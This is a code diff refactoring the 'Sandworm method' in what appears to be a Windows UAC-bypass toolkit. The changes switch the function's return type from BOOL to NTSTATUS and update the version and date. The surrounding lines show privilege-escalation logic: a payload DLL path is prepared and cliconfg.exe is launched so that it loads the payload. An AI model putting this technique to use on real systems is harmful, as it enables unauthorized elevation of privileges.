@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2018
+*  (C) COPYRIGHT AUTHORS, 2017 - 2019
 *
 *  TITLE:       SANDWORM.C
 *
-*  VERSION:     3.11
+*  VERSION:     3.17
 *
-*  DATE:        04 Dec 2018
+*  DATE:        18 Mar 2019
 *
 *  Sandworm method.
 *
@@ -60,12 +60,13 @@ CopyFiles=@ntwdblib.dll
 * Fixed in MS14-060
 *
 */
-BOOL ucmSandwormMethod(
+NTSTATUS ucmSandwormMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL bResult = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+
     WCHAR szPayloadDll[MAX_PATH * 2];
     WCHAR szInstallInf[MAX_PATH * 2];
     WCHAR szProcessBuf[MAX_PATH * 2];
@@ -105,11 +106,10 @@ BOOL ucmSandwormMethod(
                 RtlSecureZeroMemory(&szProcessBuf, sizeof(szProcessBuf));
                 _strcpy(szProcessBuf, g_ctx->szSystemDirectory);
                 _strcat(szProcessBuf, CLICONFG_EXE);
-                bResult = supRunProcess(szProcessBuf, NULL);
+                if (supRunProcess(szProcessBuf, NULL))
+                    MethodResult = STATUS_SUCCESS;
             }
         }
-
-
 
     }
 
@@ -120,5 +120,5 @@ BOOL ucmSandwormMethod(
         DeleteFile(szPayloadDll);
     }
 
-    return bResult;
+    return MethodResult;
 }
